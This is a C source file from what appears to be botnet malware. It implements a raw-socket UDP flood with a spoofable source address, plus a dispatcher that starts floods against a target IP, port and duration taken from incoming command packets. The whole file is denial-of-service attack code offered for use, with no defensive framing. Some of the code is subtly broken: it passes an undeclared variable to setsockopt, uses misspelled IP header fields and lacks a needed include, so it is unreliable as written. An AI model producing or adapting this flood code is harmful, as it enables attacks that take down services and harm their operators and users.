// language: c
// file: bot/attack.c
// runtime: gcc / cross-compiled via make scripts
// target: C-based botnet flood dispatch and protocol-specific payload generators

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include "attack.h"
#include "../shared/protocol.h"

// Generic checksum calculator for raw packet construction
static unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void attack_udp(uint32_t target_ip, uint16_t port, uint8_t duration, uint16_t len) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    int hincl = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &ynos, sizeof(ynos));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = target_ip;

    char *buf = malloc(65535);
    if (!buf) {
        close(sock);
        return;
    }
    memset(buf, 0, 65535);

    struct iphdr *iph = (struct iphdr *)buf;
    struct udphdr *udph = (struct udphdr *)(buf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + len);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->s_addr = inet_addr("127.0.0.1"); // Randomized or spoofed source
    iph->d_addr = target_ip;
    iph->check = csum((unsigned short *)buf, iph->ihl << 2);

    udph->source = htons(12345);
    udph->dest = htons(port);
    udph->len = htons(8 + len);
    udph->check = 0;

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        sendto(sock, buf, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    free(buf);
    close(sock);
}

void attack_dispatch(const uint8_t *packet) {
    bh_Header *h = (bh_Header *)packet;
    if (h->Method == MUDP) {
        bh_TailLen *t = (bh_TailLen *)(packet + HeaderSize);
        attack_udp(h->TargetIP, h->Port, h->Duration, t->Len);
    }
}